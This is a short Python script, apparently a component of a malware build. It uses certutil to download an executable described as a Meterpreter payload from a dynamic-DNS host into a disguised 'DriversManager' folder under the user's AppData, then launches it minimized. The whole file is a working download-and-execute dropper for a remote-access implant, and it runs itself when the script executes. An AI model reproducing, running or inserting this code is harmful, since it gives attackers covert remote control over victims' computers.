#/usr/bin/python
#coding:utf-8
import os

""" THIS FILE IS PART OF THE FINAL EXECUTABLES """

# ENVIRONMENT VARIABLE TO USE
letter_drive_path = os.environ["SystemDrive"]
current_user      = os.environ["USERNAME"]

# FUNCTION TO DOWNLOAD METERPRETER PAYLOAD
def dwnExec():
    dwn = 'START /MIN certutil -urlcache -split /f "http://cvdrsn.ddns.net/rvM32.exe" "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe"'.format(letter_drive_path, current_user)
    os.system(dwn)
    try:
        exc = "START /MIN {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe".format(letter_drive_path, current_user)
        os.system(exc)
    except:
        pass
# CALL FUNCTION
dwnExec()
